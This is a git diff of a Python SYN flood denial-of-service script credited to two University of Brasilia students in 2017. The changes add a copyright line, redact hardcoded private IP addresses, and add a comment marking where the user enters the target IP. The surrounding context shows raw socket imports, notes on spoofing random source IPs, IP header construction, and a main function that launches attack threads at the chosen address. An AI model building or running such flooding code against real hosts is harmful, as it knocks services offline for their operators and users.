@@ -1,6 +1,7 @@
 # Developed by GABRIEL PEREIRA PINHEIRO and VICTOR ARAUJO VIEIRA
 # In the University of Brasilia on 2017 
 # Atack SYN flood
+#All copyrights to Gabriel Pereira Pinheiro and Victor Araujo Vieira
 
 
 import socket, sys, random
@@ -61,8 +62,8 @@ def attack(numero_thread, dest_ip):
     #gera um ip de origem aleatorio, mas com os intervalos sempre de 2 a 254
     #para evitar que sejam todos 255 ou tenha 0.0.0.0
     #source_ip = '.'.join('%s'%random.randint(2, 254) for i in range(4)) 
-    #source_ip = '192.168.0.17'
-    #dest_ip = '192.168.0.101' # victor
+    #source_ip = '192...'
+    #dest_ip = '192...' 
     #show_who(dest_ip,numero_thread)
     # ip header fields
     ihl = 5
@@ -160,7 +161,7 @@ ataque = []
 def main():
 
 	qnt = menu()
-
+	#Put here the ip addres
 	dest_ip = '192.168.0.1' # ip que deseja atacar
 
 	for i in range(0, qnt):
